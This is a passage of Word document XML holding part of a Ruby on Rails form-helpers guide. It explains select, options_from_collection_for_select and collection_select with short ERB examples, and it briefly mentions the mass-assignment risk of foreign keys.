      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. One advantage here is that you don’t have to worry about pre-selecting the correct city if the user already has one — Rails will do this for you by reading from the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@person.city_id</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> attribute.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07197C7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As with other helpers, if you were to use the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> helper on a form builder scoped to the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@person</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> object, the syntax would be:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3600"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="0123C2D7" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="77C8659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select on a form builder</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DEDA6C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f.select(:city_id, ...) %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="53F65B7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If you are using </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (or similar helpers such as </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>collection_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">) to set a </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> association you must pass the name of the foreign key (in the example above </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>city_id</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">), not the name of association itself. If you specify </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>city</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> instead of </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>city_id</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Active Record will raise an error along the lines of </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ActiveRecord::AssociationTypeMismatch: City(#17815740) expected, got String(#1138750) </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">when you pass the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hash to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Person.new</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>update_attributes</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. Another way of looking at this is that form helpers only edit attributes. You should also be aware of the potential security ramifications of allowing users to edit foreign keys directly. You may wish to consider the use of </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>attr_protected</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>attr_accessible</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. For further details on this, see the </w:t>
      </w:r>
      <w:hyperlink r:id="rId306" w:anchor="mass-assignment" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Ruby On Rails Security Guide</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D1FC843"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3.3 Option Tags from a Collection of Arbitrary Objects</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3752841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Generating options tags with </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>options_for_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> requires that you create an array containing the text and value for each option. But what if you had a City model (perhaps an Active Record one) and you wanted to generate option tags from a collection of those objects? One solution would be to make a nested array by iterating over them:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7800"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="360612AD" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="73A2205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cities_array = City.all.map { |city| [city.name, city.id] } %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DBFE6C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options_for_select(cities_array) %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2207464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This is a perfectly valid solution, but Rails provides a less verbose alternative: </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>options_from_collection_for_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. This helper expects a collection of arbitrary objects and two additional arguments: the names of the methods to read the option </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>value</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>text</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> from, respectively:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7560"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="37395843" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0C1FB397" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1936942305"/>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options_from_collection_for_select(City.all, :id, :name) %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2DFBC2D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As the name implies, this only generates option tags. To generate a working select box you would need to use it in conjunction with </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, just as you would with </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>options_for_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. When working with model objects, just as </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> combines </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>options_for_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>collection_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> combines </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> with </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>options_from_collection_for_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">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7800"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="757C93F2" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2E6F0E19" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1737121354"/>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collection_select(:person, :city_id, City.all, :id, :name) %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="474493F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To recap, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>options_from_collection_for_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>collection_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> what </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>options_for_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CED37A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Pairs passed to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>options_for_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> should have the name first and the id second, however with </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>options_from_collection_for_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the first argument is the value method and the second the text method.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="237DFCF5"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3.4 Time Zone and Country Select</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="335E085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To leverage time zone support in Rails, you have to ask your users what time zone they are in. Doing so would require generating select options from a list of pre-defined TimeZone objects using </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>collection_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, but you can simply use the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>time_zone_select</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
